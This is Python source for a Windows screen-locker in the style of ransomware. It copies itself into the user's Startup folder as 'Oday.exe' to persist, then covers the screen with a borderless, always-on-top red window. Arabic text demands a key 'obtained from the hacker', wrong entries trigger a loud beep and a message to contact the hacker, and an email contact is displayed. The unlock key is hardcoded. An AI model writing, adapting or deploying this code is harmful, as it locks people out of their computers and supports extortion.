import tkinter as tk
from tkinter import messagebox
import winsound 
from PIL import Image, ImageTk
import os
import sys
import shutil
import threading


path_app = os.path.abspath(sys.argv[0])

run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows","Start Menu", "Programs", "Startup")

name = os.path.join(run_start, "Oday.exe")

if not os.path.exists(name):
    shutil.copy(path_app, name)


root = tk.Tk()

def exit_app():
    root.destroy()

def clos():
    key = "1234567"
    if entry.get() == key:
        exit_app()
    else:
        winsound.Beep(1000, 5000)
        messagebox.showerror("  لا تلعب معي  ", "   المفتاح الذي تحاول ادخاله غير صحيح تواصل مع الهكر  ")



root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")

root.overrideredirect(True)
root.attributes("-topmost", True)

tk.Label(root, text="ادخل المفتاح الل حصلت عليه من الهكر").pack()

entry = tk.Entry(root, width=50, bd=0)
entry.pack(pady=20)

b = tk.Button(root, text="دخول الي النظام" , command=clos).pack()

root.config(background="red")

Image_path = "a.png"
img = Image.open(Image_path)
photo = ImageTk.PhotoImage(img) 

tk.Label(root, image=photo, borderwidth=0, highlightthickness=0).pack()
threading.Thread(target=clos(), daemon=True).start()
tk.Label(root, text="hac@gmail.com", bg = "red", fg="white").place(x=(root.winfo_screenwidth()//2)-50, y=600)

root.resizable(False, False)







root.mainloop()
